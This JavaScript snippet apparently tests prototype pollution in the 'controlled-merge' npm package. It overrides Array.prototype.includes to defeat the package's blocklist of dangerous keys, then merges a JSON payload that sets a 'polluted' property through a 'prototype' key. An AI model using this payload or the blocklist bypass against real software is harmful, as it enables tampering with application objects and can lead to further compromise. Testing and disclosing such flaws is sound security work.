Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
console.log({}.polluted);
const merge = require('controlled-merge');
const obj = merge({}, JSON.parse('{ "testProperty": "hi", "prototype" : { "polluted" : "yes" } }'), true);
console.log('{ ' + obj.prototype.polluted + ', ' + 'yes' + ' }');